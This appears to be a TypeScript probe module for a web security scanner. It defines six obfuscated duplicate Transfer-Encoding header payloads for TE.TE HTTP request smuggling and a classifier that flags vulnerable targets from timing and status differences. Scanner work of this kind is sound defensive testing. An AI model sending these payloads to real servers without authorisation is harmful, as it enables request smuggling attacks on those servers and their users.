// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'request-smuggling-te-te',
  family: 'request-smuggling',
  title: 'HTTP request smuggling — TE.TE (obfuscated Transfer-Encoding)',
  severity: 'critical',
  destructiveRisk: 'low',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'body'],
  expectedSignals: ['timeout-delta', 'extra-response', 'status-delta'],
  cwe: [444],
};

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'smug-te-te-duplicate',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE: duplicate identical TE headers — one hop strips the second',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
    {
      id: 'smug-te-te-case-mix',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: Chunked\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE mixed-case "Chunked" vs "chunked" to confuse one hop',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-te-te-cow',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: cow\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE "cow" + "chunked" — one hop ignores unknown, other sees chunked',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
    {
      id: 'smug-te-te-null-byte',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\x00\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE with null byte in first TE to invalidate it for one parser',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-te-te-exclamation',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked!\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE with trailing ! in first TE value',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-te-te-quoted',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: "chunked"\r\nTransfer-Encoding: chunked',
      encoding: 'raw',
      intent: 'TE.TE with quoted "chunked" — RFC allows quoted tokens, many parsers reject',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const timingDelta = resp.responseTimeMs - baseline.responseTimeMs;

  if (timingDelta > 4000) {
    responseClass = 'timing-delta';
    confidence = 0.78;
    nextAction = 'confirm';
    evidence.push(`TE.TE timing delta ${timingDelta}ms for variant ${variant.id}`);
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.45;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'continue';
    evidence.push('No TE.TE signal from this variant');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
